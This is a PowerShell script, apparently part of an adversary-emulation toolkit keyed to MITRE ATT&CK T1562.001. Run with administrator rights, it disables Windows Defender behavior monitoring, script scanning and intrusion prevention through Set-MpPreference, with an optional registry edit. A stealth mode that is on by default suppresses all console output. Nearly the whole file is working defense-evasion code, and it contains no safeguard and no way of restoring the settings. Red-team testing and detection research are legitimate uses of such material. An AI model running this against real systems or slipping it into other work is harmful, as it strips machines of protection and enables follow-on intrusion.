# T1562.001C - MITRE ATT&CK Impair Defenses: Disable Windows Defender Behavior Monitoring
# Tactic: TA0005 Defense Evasion - Specific Behavior Monitoring disable only
# Package Type: inject - Active system modification (single atomic action)
# Script Length: ~115 lines (atomic focus)
# Functions: 5 infrastructure + 4 triple output + 1 technique function

#Requires -Version 3.0
#Requires -RunAsAdministrator


function Get-EnvironmentVariables {
    $config = @{
        # Variables de base
        OUTPUT_BASE = if ($env:T1562_001_OUTPUT_BASE) { $env:T1562_001_OUTPUT_BASE } else { "C:\temp\mitre_results" }
        DEBUG_MODE = if ($env:T1562_001_DEBUG_MODE) { $env:T1562_001_DEBUG_MODE -eq "true" } else { $false }
        STEALTH_MODE = if ($env:T1562_001_STEALTH_MODE) { $env:T1562_001_STEALTH_MODE -eq "true" } else { $true }
        SAFE_MODE = if ($env:T1562_001_SAFE_MODE) { $env:T1562_001_SAFE_MODE -eq "true" } else { $false }
        
        # Variables sp cifiques Behavior Monitoring
        DISABLE_BEHAVIOR_MONITORING = if ($env:T1562_001_DISABLE_BEHAVIOR_MONITORING) { $env:T1562_001_DISABLE_BEHAVIOR_MONITORING -eq "true" } else { $true }
        DISABLE_SCRIPT_SCANNING = if ($env:T1562_001_DISABLE_SCRIPT_SCANNING) { $env:T1562_001_DISABLE_SCRIPT_SCANNING -eq "true" } else { $true }
        DISABLE_INTRUSION_PREVENTION = if ($env:T1562_001_DISABLE_INTRUSION_PREVENTION) { $env:T1562_001_DISABLE_INTRUSION_PREVENTION -eq "true" } else { $true }
        REGISTRY_BACKUP = if ($env:T1562_001_REGISTRY_BACKUP) { $env:T1562_001_REGISTRY_BACKUP -eq "true" } else { $false }
    }
    
    return $config
}

function Initialize-OutputStructure {
    param([string]$OutputBase, [string]$TechniqueId)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = Join-Path $OutputBase "${TechniqueId}_${timestamp}"
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    return $outputDir
}

function Write-JsonOutput {
    param([hashtable]$Data, [string]$OutputPath, [hashtable]$Metadata)
    
    $jsonOutput = @{
        technique_id = $Metadata.technique_id
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        results = $Data
        system_context = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
        }
    }
    
    $jsonOutput | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Get-ExecutionMetadata {
    param([string]$TechniqueId, [string]$Action)
    
    return @{
        technique_id = $TechniqueId
        action = $Action
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        hostname = $env:COMPUTERNAME
    }
}

function Invoke-SafeCommand {
    param([string]$Command, [hashtable]$Config, [string]$Description = "")
    
    if ($Config.SAFE_MODE) {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[SAFE MODE - REAL EXECUTION] Executing: $Description" -ForegroundColor Yellow
        }
    }
    
    try {
        $result = Invoke-Expression $Command 2>&1
        return @{ success = $true; output = $result }
    }
    catch {
        return @{ success = $false; output = $_.Exception.Message }
    }
}


function Write-SimpleOutput {
    param([hashtable]$Results, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) { return }
    
    Write-Host "T1562.001C BEHAVIOR MONITORING DISABLE " -ForegroundColor Red
    $behaviorStatus = if ($Results.behavior_monitoring_disabled) { "DISABLED" } else { "FAILED" }
    $scriptStatus = if ($Results.script_scanning_disabled) { "DISABLED" } else { "FAILED" }
    $ipsStatus = if ($Results.intrusion_prevention_disabled) { "DISABLED" } else { "FAILED" }
    
    Write-Host "Behavior Monitoring: $behaviorStatus" -ForegroundColor $(if ($Results.behavior_monitoring_disabled) { "Green" } else { "Red" })
    Write-Host "Script Scanning: $scriptStatus" -ForegroundColor $(if ($Results.script_scanning_disabled) { "Green" } else { "Red" })
    Write-Host "Intrusion Prevention: $ipsStatus" -ForegroundColor $(if ($Results.intrusion_prevention_disabled) { "Green" } else { "Red" })
}

function Write-DebugOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    if ($Config.DEBUG_MODE) {
        $debugFile = Join-Path (Split-Path $OutputPath) "debug_behavior.json"
        Write-JsonOutput -Data $Results -OutputPath $debugFile -Metadata $Metadata
    }
}

function Write-StealthOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) {
        $stealthFile = Join-Path (Split-Path $OutputPath) "behavior.log"
        "T1562.001C executed at $(Get-Date)" | Out-File -FilePath $stealthFile -Append
    }
}

function Select-OutputMode {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    Write-SimpleOutput -Results $Results -Config $Config
    Write-DebugOutput -Results $Results -OutputPath $OutputPath -Metadata $Metadata -Config $Config
    Write-StealthOutput -Results $Results -OutputPath $OutputPath -Config $Config
}


# TECHNIQUE-SPECIFIC FUNCTION (ATOMIC ACTION)


function Disable-BehaviorMonitoring {
    param([hashtable]$Config)
    
    $results = @{
        behavior_monitoring_disabled = $false
        script_scanning_disabled = $false
        intrusion_prevention_disabled = $false
        registry_modified = $false
        errors = @()
    }
    
    # 1. Disable Behavior Monitoring
    if ($Config.DISABLE_BEHAVIOR_MONITORING) {
        $behaviorCmd = 'Set-MpPreference -DisableBehaviorMonitoring $true'
        $result = Invoke-SafeCommand -Command $behaviorCmd -Config $Config -Description "Disabling Behavior Monitoring"
        $results.behavior_monitoring_disabled = $result.success
        
        if (-not $result.success) {
            $results.errors += "Behavior monitoring disable failed: $($result.output)"
        }
    }
    
    # 2. Disable Script Scanning
    if ($Config.DISABLE_SCRIPT_SCANNING) {
        $scriptCmd = 'Set-MpPreference -DisableScriptScanning $true'
        $result = Invoke-SafeCommand -Command $scriptCmd -Config $Config -Description "Disabling Script Scanning"
        $results.script_scanning_disabled = $result.success
        
        if (-not $result.success) {
            $results.errors += "Script scanning disable failed: $($result.output)"
        }
    }
    
    # 3. Disable Intrusion Prevention System
    if ($Config.DISABLE_INTRUSION_PREVENTION) {
        $ipsCmd = 'Set-MpPreference -DisableIntrusionPreventionSystem $true'
        $result = Invoke-SafeCommand -Command $ipsCmd -Config $Config -Description "Disabling Intrusion Prevention"
        $results.intrusion_prevention_disabled = $result.success
        
        if (-not $result.success) {
            $results.errors += "IPS disable failed: $($result.output)"
        }
    }
    
    # 4. Registry-based backup (additional method)
    if ($Config.REGISTRY_BACKUP) {
        $regCmd = @'
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if (Test-Path $regPath) {
    Set-ItemProperty -Path $regPath -Name "BehaviorMonitoring" -Value 0 -Force
}
'@
        $result = Invoke-SafeCommand -Command $regCmd -Config $Config -Description "Registry behavior monitoring disable"
        $results.registry_modified = $result.success
    }
    
    return $results
}


# MAIN EXECUTION


try {
    $config = Get-EnvironmentVariables
    $metadata = Get-ExecutionMetadata -TechniqueId "T1562.001c" -Action "disable_behavior_monitoring"
    $outputDir = Initialize-OutputStructure -OutputBase $Config.OUTPUT_BASE -TechniqueId $metadata.technique_id
    
    $results = Disable-BehaviorMonitoring -Config $config
    
    $outputFile = Join-Path $outputDir "behavior_monitoring_results.json"
    Select-OutputMode -Results $results -OutputPath $outputFile -Metadata $metadata -Config $config
    
} catch {
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    exit 1
}


